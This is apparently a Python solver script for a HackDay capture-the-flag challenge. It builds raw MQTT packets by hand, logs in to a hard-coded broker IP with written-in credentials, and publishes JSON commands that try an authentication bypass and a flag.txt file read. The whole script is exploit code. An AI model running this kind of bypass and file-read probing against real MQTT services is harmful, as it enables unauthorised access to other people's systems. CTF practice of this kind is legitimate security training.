import socket
import struct
import time
import random
import string
import json

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len]) 
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    if rem_len < 128:
        fixed_header += bytes([rem_len])
    else:
        fixed_header += bytes([(rem_len & 0x7F) | 0x80, rem_len >> 7])
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("final-solver-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    resp_topic = "response/final_flag_capture"
    s.sendall(mqtt_subscribe(resp_topic, 5001))
    s.sendall(mqtt_subscribe("response/#", 5002))
    
    # Try the Y2K auth bypass
    # The message said getflag 946684800 (which is 2000-01-01 00:00:00)
    # Let's try token 0 or 1900 or 946684800
    
    cmds = [
        {"cmd": "auth", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getfile", "file": "flag.txt", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "y2k": True, "response_topic": resp_topic}
    ]
    
    for c in cmds:
        msg = json.dumps(c)
        print(f"[*] Sending JSON: {msg}")
        s.sendall(mqtt_publish("ctf/hackday", msg))
        time.sleep(0.5)

    start_time = time.time()
    try:
        while time.time() - start_time < 20:
            data = s.recv(4096)
            if not data: break
            try:
                decoded = data.decode(errors='ignore')
                print(f"[*] Raw: {data.hex()}")
                print(f"[*] Text: {decoded}")
                if "HACKDAY{" in decoded:
                    print("[!!!] FLAG FOUND [!!!]")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
